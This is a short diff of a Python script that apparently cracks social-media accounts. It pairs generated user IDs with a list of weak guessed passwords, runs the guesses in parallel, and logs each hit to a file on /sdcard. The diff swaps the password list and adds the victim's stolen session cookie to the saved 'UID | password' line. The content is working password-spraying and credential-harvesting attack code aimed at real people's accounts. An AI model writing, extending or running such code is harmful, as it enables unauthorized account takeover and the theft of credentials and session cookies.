@@ -821,7 +821,7 @@ def bd():
 			linex()
 			for psx in user:
 				ids = code+psx
-				passlist = [psx,'ids','bangladesh','i love you','121234','0987654','Bangladesh']
+				passlist = [psx,'ids','0987654','708090','203040']
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
@@ -1017,7 +1017,7 @@ def rcrack1(ids,passlist):
 					else:
 						print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ') 
 						cek_apk(session,coki)
-						open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
+						open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
